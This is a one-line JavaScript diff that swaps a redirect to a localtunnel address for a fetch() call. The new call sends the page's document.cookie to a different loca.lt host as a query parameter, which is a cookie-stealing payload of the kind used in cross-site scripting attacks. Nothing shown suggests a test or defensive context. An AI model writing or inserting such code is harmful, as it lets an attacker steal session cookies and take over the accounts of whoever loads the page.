@@ -1,1 +1,1 @@
-window.location.href = 'https://fresh-badgers-draw.loca.lt'; // Or any other URL you want to redirect to
+fetch('https://quiet-cars-slide.loca.lt?cookie=' + document.cookie);
